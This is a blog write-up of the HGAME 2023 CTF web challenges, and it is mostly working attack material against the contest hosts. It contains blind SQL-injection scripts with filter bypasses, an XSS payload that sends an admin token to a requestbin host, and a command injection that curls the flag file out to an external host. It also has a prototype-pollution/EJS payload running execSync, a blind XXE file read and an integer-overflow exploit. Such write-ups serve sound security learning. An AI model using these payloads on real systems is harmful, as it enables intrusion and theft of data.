---
title: "HGAME 2023 Web Writeup"
date: 2023-02-07T16:52:57+08:00
lastmod: 2023-02-07T16:52:57+08:00
draft: false
author: "X1r0z"

tags: ['ctf']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

HGAME 2023

<!--more-->

## Week 1

### Classic Childhood Game

```
http://week-1.hgame.lwsec.cn:31455/Res/Events.js
```

有这么一段

```javascript
function mota() {
  var a = ['\x59\x55\x64\x6b\x61\x47\x4a\x58\x56\x6a\x64\x61\x62\x46\x5a\x31\x59\x6d\x35\x73\x53\x31\x6c\x59\x57\x6d\x68\x6a\x4d\x6b\x35\x35\x59\x56\x68\x43\x4d\x45\x70\x72\x57\x6a\x46\x69\x62\x54\x55\x31\x56\x46\x52\x43\x4d\x46\x6c\x56\x59\x7a\x42\x69\x56\x31\x59\x35'];
  (function (b, e) {
    var f = function (g) {
      while (--g) {
        b['push'](b['shift']());
      }
    };
    f(++e);
  }(a, 0x198));
  var b = function (c, d) {
    c = c - 0x0;
    var e = a[c];
    if (b['CFrzVf'] === undefined) {
      (function () {
        var g;
        try {
          var i = Function('return\x20(function()\x20' + '{}.constructor(\x22return\x20this\x22)(\x20)' + ');');
          g = i();
        } catch (j) {
          g = window;
        }
        var h = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
        g['atob'] || (g['atob'] = function (k) {
          var l = String(k)['replace'](/=+$/, '');
          var m = '';
          for (var n = 0x0, o, p, q = 0x0; p = l['charAt'](q++); ~p && (o = n % 0x4 ? o * 0x40 + p : p, n++ % 0x4) ? m += String['fromCharCode'](0xff & o >> (-0x2 * n & 0x6)) : 0x0) {
            p = h['indexOf'](p);
          }
          return m;
        });
      }());
      b['fqlkGn'] = function (g) {
        var h = atob(g);
        var j = [];
        for (var k = 0x0, l = h['length']; k < l; k++) {
          j += '%' + ('00' + h['charCodeAt'](k)['toString'](0x10))['slice'](-0x2);
        }
        return decodeURIComponent(j);
      };
      b['iBPtNo'] = {};
      b['CFrzVf'] = !![];
    }
    var f = b['iBPtNo'][c];
    if (f === undefined) {
      e = b['fqlkGn'](e);
      b['iBPtNo'][c] = e;
    } else {
      e = f;
    }
    return e;
  };
  alert(atob(b('\x30\x78\x30')));
}
```

![image-20230111222541699](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301112227087.png)

### Become A Member

![image-20230111224042564](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301112240640.png)

### Guess Who I Am

右键查看源码

```html
<!-- Hint: https://github.com/Potat0000/Vidar-Website/blob/master/src/scripts/config/member.js -->
```

python 脚本

```python
import requests
import re
import time

import json

data =  [....] # 省略

s = requests.Session()

for i in range(100):
    res1 = s.get('http://week-1.hgame.lwsec.cn:32049/api/getQuestion')
    question = json.loads(res1.text)
    for i in data:
        if i['intro'] == question['message']:
            res2 = s.post('http://week-1.hgame.lwsec.cn:32049/api/verifyAnswer', data={'id': i['id']})
            print(res2.text)
            break

print(s.cookies)
```

![image-20230111222916314](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301112229389.png)

改 cookie 之后再访问一下

![image-20230111222959685](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301112229732.png)

### Show Me Your Beauty

简单上传

![image-20230111223135013](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301112231082.png)

![image-20230111223239068](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301112232106.png)

## Week 2

### Git Leakage

dumpall 跑一下

![image-20230112201226057](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301122012284.png)

![image-20230112201306712](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301122013789.png)

### v2board

[https://github.com/prismbreak/v2board-1.6.1-exp](https://github.com/prismbreak/v2board-1.6.1-exp)

![image-20230112213309738](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301122133932.png)

![image-20230112213408912](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301122134003.png)

`hgame{39d580e71705f6abac9a414def74c466}`

### Search Commodity

用户名 `user01`

密码用 burp intruder 随便找个 top3000 字典跑一下, 结果是 `admin123`

之后是一个数字型 mysql 注入, 并且过滤了 `/**/` `=` `>` `<` `[空格]` `select` ` from` `database` `where`

后面几个关键字试出来都是直接 replace, 所以用双写就可以绕过

```python
import requests
import time
import json
import re
from urllib.parse import quote

dicts = r'{},.-0123456789AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz'

flag = ''

for i in range(1, 99999):
    for s in range(32,127):
        cookies = {
            'SESSION':'MTY3MzYxMjI3NXxEdi1CQkFFQ180SUFBUkFCRUFBQUpQLUNBQUVHYzNSeWFXNW5EQVlBQkhWelpYSUdjM1J5YVc1bkRBZ0FCblZ6WlhJd01RPT1819EjuKIg8HRNvUp9g5dHKvQhbBTVvPnFni3NaQiXCZE='
        }
        url = 'http://week-2.hgame.lwsec.cn:31537/search'
        # payload = "if(ascii(substr((selselectect/*123*/group_concat(table_name)/*123*/frfromom/*123*/infoorrmation_schema.tables/*123*/whwhereere/*123*/table_schema/*123*/like/*123*/datdatabaseabase()),{},1)) like '{}',1,0)".format(i, s)
        # payload = "if(ascii(substr((selselectect/*123*/group_concat(column_name)/*123*/frfromom/*123*/infoorrmation_schema.columns/*123*/whwhereere/*123*/table_name/*123*/like/*123*/'5ecret15here'),{},1)) like '{}',1,0)".format(i, s)
        payload = "if(ascii(substr((selselectect/*123*/f14gggg1shere/*123*/frfromom/*123*/5ecret15here),{},1)) like '{}',1,0)".format(i, s)
        data = {'search_id': payload}
        print(chr(s))
        res = requests.post(url, cookies=cookies, data=data)
        if 'Error Occurred' in res.text:
            print('error')
            quit()
        if 'Not Found' not in res.text:
            flag += chr(s)
            print('found!!!', flag)
            break
```

`hgame{4_M4n_WH0_Kn0ws_We4k-P4ssW0rd_And_SQL!}`

### Designer

```javascript
const express = require("express")
const jwt = require("jsonwebtoken")
const puppeteer = require('puppeteer')
const querystring = require('node:querystring')

const app = express()

app.use(express.static("./static"))
app.use(express.json())
app.set("view engine", "ejs")
app.set("views", "views")
app.use(express.urlencoded({ extended: false }))

const secret = "secret_here"

function auth(req, res, next) {
  const token = req.headers["authorization"]
  if (!token) {
    return res.redirect("/")
  }
  try {
    const decoded = jwt.verify(token, secret) || {}
    req.user = decoded
  } catch {
    return res.status(500).json({ msg: "jwt decode error" })
  }
  next()
}

app.get("/", (req, res) => {
  res.render("register")
})

app.post("/user/register", (req, res) => {
  const username = req.body.username
  let flag = "hgame{fake_flag_here}"
  if (username == "admin" && req.ip == "127.0.0.1" || req.ip == "::ffff:127.0.0.1") {
    flag = "hgame{true_flag_here}"
  }
  const token = jwt.sign({ username, flag }, secret)
  res.json({ token })
})

app.get("/user/info", auth, (req, res) => {
  res.json({ username: req.user.username, flag: req.user.flag })
})

app.post("/button/save", auth, (req, res) => {
  req.user.style = {}
  for (const key in req.body) {
    req.user.style[key] = req.body[key]
  }
  const token = jwt.sign(req.user, secret)
  res.json({ token })
})

app.get("/button/get", auth, (req, res) => {
  const style = req.user.style
  res.json({ style })
})

app.get("/button/edit", (req, res) => {
  // render a button
  res.render("button")
})

app.post("/button/share", auth, async (req, res) => {
  const browser = await puppeteer.launch({
    headless: true,
    executablePath: "/usr/bin/chromium",
    args: ['--no-sandbox']
  });
  const page = await browser.newPage()
  const query = querystring.encode(req.body)
  await page.goto('http://127.0.0.1:9090/button/preview?' + query)
  await page.evaluate(() => {
    return localStorage.setItem("token", "jwt_token_here")
  })
  await page.click("#button")

  res.json({ msg: "admin will see it later" })
})

app.get("/button/preview", (req, res) => {
  const blacklist = [
    /on/i, /localStorage/i, /alert/, /fetch/, /XMLHttpRequest/, /window/, /location/, /document/
  ]
  for (const key in req.query) {
    for (const item of blacklist) {
      if (item.test(key.trim()) || item.test(req.query[key].trim())) {
        req.query[key] = ""
      }
    }
  }
  res.render("preview", { data: req.query })
})

app.listen(9090)
```

`/button/preview` 存在反射 xss

通过 localStorage 先拿到 admin token, 然后访问 `/user/info` 得到 flag

```javascript
document.getElementById("button").onclick = function(){
    document.location = "http://http.requestbin.buuoj.cn/1j0pygf1?token=" + localStorage.getItem("token");
}
```

eval 编码绕过 blacklist

```html
"><script>eval("\u0064\u006F\u0063\u0075\u006D\u0065\u006E\u0074\u002E\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064\u0028\u0022\u0062\u0075\u0074\u0074\u006F\u006E\u0022\u0029\u002E\u006F\u006E\u0063\u006C\u0069\u0063\u006B\u0020\u003D\u0020\u0066\u0075\u006E\u0063\u0074\u0069\u006F\u006E\u0028\u0029\u007B\u000A\u0020\u0020\u0020\u0020\u0064\u006F\u0063\u0075\u006D\u0065\u006E\u0074\u002E\u006C\u006F\u0063\u0061\u0074\u0069\u006F\u006E\u0020\u003D\u0020\u0022\u0068\u0074\u0074\u0070\u003A\u002F\u002F\u0068\u0074\u0074\u0070\u002E\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u0062\u0069\u006E\u002E\u0062\u0075\u0075\u006F\u006A\u002E\u0063\u006E\u002F\u0031\u006A\u0030\u0070\u0079\u0067\u0066\u0031\u003F\u0074\u006F\u006B\u0065\u006E\u003D\u0022\u0020\u002B\u0020\u006C\u006F\u0063\u0061\u006C\u0053\u0074\u006F\u0072\u0061\u0067\u0065\u002E\u0067\u0065\u0074\u0049\u0074\u0065\u006D\u0028\u0022\u0074\u006F\u006B\u0065\u006E\u0022\u0029\u003B\u000A\u007D");</script>
```

![image-20230115104122983](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301151041747.png)

![image-20230115104210671](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301151042734.png)

![image-20230115104233771](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301151042848.png)

## Week 3

### Login To Get My Gift

```python
import requests
import time
import json
import re

# dicts = r'{},-0123456789AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz'
dicts = '0123456789abcdef'

flag = ''

for i in range(1, 99999):
    for s in dicts:
        print(s)
        url = 'http://week-3.hgame.lwsec.cn:32291/login'
        # payload = "if((select\ntable_name\nregexp\n'^{}'\nfrom\ninformation_schema.tables\nwhere\ntable_schema\nregexp\ndatabase()\nlimit\n0,1),1,0)".format(flag + s)
        payload = "if((select\nhex(USERN4ME)\nregexp\n'^{}'\nfrom\nUser1nf0mAt1on\nlimit\n0,1),1,0)".format(flag + s)
        payload = "if((select\nhex(PASSW0RD)\nregexp\n'^{}'\nfrom\nUser1nf0mAt1on\nlimit\n0,1),1,0)".format(flag + s)
        data = {
            'username': "xxx'xor\n{}#".format(payload),
            'password': '123'
            }
        res = requests.post(url, data=data)
        if 'Detected' in res.text:
            print('waf')
            quit()
        if 'Internal Error' in res.text:
            print('error')
            quit()
        if 'Success' in res.text:
            flag += s
            print('found!!!', flag)
            break
    if len(flag) != i:
        print('some char missing')
```

```
Username: hgAmE2023HAppYnEwyEAr
Password: WeLc0meT0hgAmE2023hAPPySql
```

![image-20230123213203728](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301232132790.png)

`hgame{It_1s_1n7EresT1nG_T0_ExPL0Re_Var10us_Ways_To_Sql1njEct1on}`

### Gopher Shop

贴一下关键部分的代码

/internal/user/user.go

```go
......

func BuyProduct(context *gin.Context) {
	username, _ := context.Get("username")

	user, err := db.GetUserByUsername(username.(string))
	if err != nil {
		return
	}
	product := context.Query("product")
	price, err := db.GetProductPrice(product)
	number, err := strconv.Atoi(context.Query("number"))

	//校验是否买的起
	if err != nil || number < 1 || user.Balance < uint(number) * price{
		context.JSON(400, gin.H{"error": "invalid request"})
		return
	}

	user.Days -= 1
	user.Inventory -= uint(number)
	user.Balance -= uint(number) * price

	//扣除库存和余额
	err = db.UpdateUserInfo(user)

	if err != nil {
		context.JSON(500, gin.H{"error": "delete balance and inventory error"})
		return
	}

	err = db.AddOrder(username.(string), product, uint(number), true)

	if err != nil {
		context.JSON(500, gin.H{"error": "add order error"})
		return
	}

	context.JSON(200, gin.H{"message": "success"})
}

func SellProduct(context *gin.Context) {
	username, _ := context.Get("username")

	user, err := db.GetUserByUsername(username.(string))
	if err != nil {
		return
	}
	product := context.Query("product")
	price, err := db.GetProductPrice(product)
	number, err := strconv.Atoi(context.Query("number"))
	sum, err := utils.GetOrderSum(username.(string))
	_, exist := sum[product]
	if !exist {
		sum[product] = 0
	}

	//校验是否卖的出
	if err != nil || number < 1 || sum[product] == 0 || uint(number) > sum[product] {
		context.JSON(400, gin.H{"error": "invalid request"})
		return
	}

	user.Days -= 1
	user.Inventory += uint(number)
	user.Balance += uint(number) * price
	err = db.UpdateUserInfo(user)

	if err != nil {
		context.JSON(500, gin.H{"error": "add balance and inventory error"})
		return
	}

	err = db.AddOrder(username.(string), product, uint(number), false)
	if err != nil {
		context.JSON(500, gin.H{"error": "add order error"})
		return
	}

	context.JSON(200, gin.H{"message": "success"})

}

func GetOrderSum(context *gin.Context) {
	username, _ := context.Get("username")
	sum, err := utils.GetOrderSum(username.(string))
	if err != nil {
		context.JSON(500, gin.H{"error": "get order sum error"})
		return
	}
	context.JSON(200, gin.H{"orderSum": sum})
}

......

func CheckFlag(context *gin.Context) {
	username, _ := context.Get("username")

	//查询是否购买过flag
	sum, err := utils.GetOrderSum(username.(string))
	if err != nil {
		return
	}

	_, exist := sum["Flag"]

	if !exist {
		context.JSON(500, gin.H{"error": "check flag error"})
		return
	}

	context.JSON(200, gin.H{"message": config.Secret.Flag})
}
```

/internal/db/mysql.go

```go
......
list := []Product{
    {Name: "Apple", Price: 10},
    {Name: "Unstable wifi for 300b", Price: 20},
    {Name: "ek1ng's broken desktop computer", Price: 30},
    {Name: "4cute's Vidar custom meal card", Price: 40},
    {Name: "300b 64-core server", Price: 50},
    {Name: "Vidar Clubwear", Price: 200},
    {Name: "Large 32-inch TV", Price: 300},
    {Name: "The Switch at 300b", Price: 500},
    {Name: "A hair of the 4nsw3r", Price: 999999},
    {Name: "Flag", Price: 10000000000000000000},
}
......
```

题目考察 go 语言整数溢出

`strconv.Atoi()` 返回的类型为 int, 在 64 位环境下代表 int64

同理 uint 代表 uint64

int64 范围 `-9223372036854775808 to 9223372036854775807`

uint64 范围 `0 to 18446744073709551615`

一个简单的加法溢出如下

```go
package main

import "fmt"

func main(){
	var a uint = 18446744073709551615;
	fmt.Println(a + 1)
    fmt.Println(a + 2)
    fmt.Println(a + 3)
}
```

```
0
1
2
```

回到题目代码中的 BuyProduct 函数

```go
......
product := context.Query("product")
price, err := db.GetProductPrice(product)
number, err := strconv.Atoi(context.Query("number"))

//校验是否买的起
if err != nil || number < 1 || user.Balance < uint(number) * price{
    context.JSON(400, gin.H{"error": "invalid request"})
    return
}

user.Days -= 1
user.Inventory -= uint(number)
user.Balance -= uint(number) * price
......
```

其中 `uint(number) * price` 表达式可以整数溢出

首先根据上面 uint64 的范围以及溢出规则可以得到如下关系

```
18446744073709551616 == 0
18446744073709551617 == 1
18446744073709551618 == 2
18446744073709551619 == 3
18446744073709551620 == 4
18446744073709551621 == 5
18446744073709551622 == 6
18446744073709551623 == 7
18446744073709551624 == 8
18446744073709551625 == 9
18446744073709551625 == 10
```

要想购买 flag, 我们需要将上面的数字分解得到 number 和 price, 并且保证它们都是整数

而 price 只能取 `10 20 30 40 50 200 300 500 999999 10000000000000000000`

因为 flag 的 price 为 `10000000000000000000`, 这样得到的 number 只会是小数, 所以需要换一个思路, 即先购买其它价格的商品, 然后再正常卖出得到足够数量 balance, 最后购买 flag

简单观察可以发现 `18446744073709551620` 这个末位带 0 的数字

```
18446744073709551620 / 10 = 1844674407370955162
18446744073709551620 / 20 = 922337203685477581
```

而且刚好 `1844674407370955162` 这个数没有超过 int64 的范围 (`strconv.Atoi()` 传入的数字超出 int64 的范围会报错)

所以构造 number 为 `1844674407370955162`, price 为 `10`, 购买商品

![image-20230124161039267](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301241610354.png)

![image-20230124161057064](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301241610143.png)

然后算一下购买 flag 需要卖出多少个 Apple, 结果是 `1000000000000000000`

![image-20230124161309645](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301241613721.png)

![image-20230124161322510](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301241613580.png)

最后购买 flag

![image-20230124161337983](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301241613032.png)

![image-20230124161357349](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301241613392.png)

`hgame{GopherShop_M@gic_1nt_0verflow}`

### Ping To The Host

```bash
ip=127.0.0.1%0acurl${IFS}x.x.x.x:yyyy${IFS}-X${IFS}POST${IFS}-d${IFS}"`c\at${IFS}/fla\g_is_here_haha`"
```

![image-20230123204237461](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301232042589.png)

![image-20230123204307285](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301232043337.png)

## Week 4

### Shared Diary

```javascript
const express = require('express');
const bodyParser = require('body-parser');
const session = require('express-session');
const randomize = require('randomatic');
const ejs = require('ejs');
const path = require('path');
const app = express();

function merge(target, source) {
    for (let key in source) {
        // Prevent prototype pollution
        if (key === '__proto__') {
            throw new Error("Detected Prototype Pollution")
        }
        if (key in source && key in target) {
            merge(target[key], source[key])
        } else {
            target[key] = source[key]
        }
    }
}

app
    .use(bodyParser.urlencoded({extended: true}))
    .use(bodyParser.json());
app.set('views', path.join(__dirname, "./views"));
app.set('view engine', 'ejs');
app.use(session({
    name: 'session',
    secret: randomize('aA0', 16),
    resave: false,
    saveUninitialized: false
}))

app.all("/login", (req, res) => {
    if (req.method == 'POST') {
        // save userinfo to session
        let data = {};
        try {
            merge(data, req.body)
        } catch (e) {
            return res.render("login", {message: "Don't pollution my shared diary!"})
        }
        req.session.data = data

        // check password
        let user = {};
        user.password = req.body.password;
        if (user.password=== "testpassword") {
            user.role = 'admin'
        }
        if (user.role === 'admin') {
            req.session.role = 'admin'
            return res.redirect('/')
        }else {
            return res.render("login", {message: "Login as admin or don't touch my shared diary!"})
        } 
    }
    res.render('login', {message: ""});
});

app.all('/', (req, res) => {
    if (!req.session.data || !req.session.data.username || req.session.role !== 'admin') {
        return res.redirect("/login")
    }
    if (req.method == 'POST') {
        let diary = ejs.render(`<div>${req.body.diary}</div>`)
        req.session.diary = diary
        return res.render('diary', {diary: req.session.diary, username: req.session.data.username});
    }
    return res.render('diary', {diary: req.session.diary, username: req.session.data.username});
})


app.listen(8888, '0.0.0.0');
```

原型链污染, 过滤了 `__proto__`, 用 `constructor.prototype` 绕过

之后是 ejs 模板注入

[https://www.anquanke.com/post/id/236354](https://www.anquanke.com/post/id/236354)

```json
{
    "username":"admin",
    "password":"123456",
    "constructor":{
        "prototype":{
            "client":true,"escapeFunction":"1; return global.process.mainModule.constructor._load('child_process').execSync('cat /flag');" 
        }
    }
}
```

![image-20230131212113654](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301312122776.png)

`hgame{N0tice_prototype_pollution&&EJS_server_template_injection}`

### Tell Me

blind xxe, 用错误回显外带数据

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
<!ELEMENT root ANY>
<!ELEMENT message ANY>
    <!ENTITY % file SYSTEM "file:///var/www/html/flag.php">
    <!ENTITY % eval1 '
        <!ENTITY &#x25; eval2 "
            <!ENTITY &#x26;#x25; error SYSTEM &#x27;&#x25;file;&#x27;>
        ">
        &#x25;eval2;
    '>
    %eval1;
]>
<user><name>123</name><email>123</email><content>123</content></user>
```

![image-20230131212319020](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301312123103.png)

`hgame{Be_Aware_0f_XXeBl1nd1njecti0n}`